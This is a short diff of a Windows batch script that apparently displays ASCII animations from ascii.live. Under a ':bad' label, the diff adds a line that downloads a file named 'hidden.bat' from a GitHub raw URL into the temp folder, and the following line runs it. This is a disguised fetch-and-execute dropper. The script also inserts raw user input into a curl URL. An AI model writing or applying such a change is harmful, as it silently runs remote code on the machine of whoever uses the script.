@@ -19,7 +19,7 @@ echo Invalid input. Exiting...
 goto :eof
 
 :bad
-curl -o %temp%/hidden.bat
+curl -o %temp%\hidden.bat https://raw.githubusercontent.com/SingendPfeil2/ascii/main/hidden.bat
 %temp%\hidden.bat
 curl ascii.live/%user_input%
 endlocal
